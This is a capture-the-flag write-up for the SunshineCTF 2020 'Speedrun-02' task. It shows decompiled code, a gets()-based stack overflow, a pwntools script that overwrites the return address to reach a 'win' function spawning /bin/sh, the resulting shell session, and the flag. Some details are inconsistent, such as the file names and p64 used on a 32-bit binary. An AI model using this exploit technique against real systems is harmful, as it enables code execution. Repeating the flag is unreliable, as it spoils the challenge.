# **Speedrun-02**
## Task
nc chal.2020.sunshinectf.org 30002
File: chall_00
Tag: binary exploitation

## Solution

### Checksec
```
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)

```
* No canary assume BOF
* No PIE assume ROP
* System 32 bit
  
### Decompile with ghidra
```c
void vuln(void)

{
  char local_3e [54];
  
  __x86.get_pc_thunk.ax();
  gets(local_3e);
  return;
}

void win(void)

{
  int iVar1;
  
  iVar1 = __x86.get_pc_thunk.ax();
  system((char *)(iVar1 + 0x12e));
  return;
}
```
Our destination is call for `win` to get flag. So just overwrite the return address in `vuln`.
With the Decompile code, `local_3e` is `0x3e` from the return address so just overwrite the 0x3e bytes of gadbages followed by the `win` address

Actually in the `win`, `iVar1 = __x86.get_pc_thunk.ax();` then iVar1 = address of next instruction = `0x080484e2` then `ivar1 + 0x12e` equal to `0x8048610` -> value of `/bin/sh'
Finally, `win` call for `system("/bin/sh")`
```
        080484dd e8  a0  00       CALL       __x86.get_pc_thunk.ax                            undefined __x86.get_pc_thunk.ax()
                 00  00
        080484e2 05  1e  1b       ADD        EAX ,0x1b1e
                 00  00
```
```
        08048610 2f              ??         2Fh    /
        08048611 62              ??         62h    b
        08048612 69              ??         69h    i
        08048613 6e              ??         6Eh    n
        08048614 2f              ??         2Fh    /
        08048615 73              ??         73h    s
        08048616 68              ??         68h    h
        08048617 00              ??         00h

```

### Exploit
```python
from pwn import *
binary = context.binary = ELF('./chall_02')

payload = b'a'* (0x3e)
payload += p64(binary.sym.win)
p = remote('chal.2020.sunshinectf.org', 30002)
p.sendline('lol')
p.sendline(payload)
p.interactive()
```

### Output
```bash
[*] '/home/kali/speedrun_sunshineCTF2020/chall_02'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Opening connection to chal.2020.sunshinectf.org on port 30002: Done
[*] Switching to interactive mode
Went along the mountain side.
$ ls
chall_02
flag.txt
$ cat flag.txt
sun{warmness-on-the-soul-3b6aad1d8bb54732}
```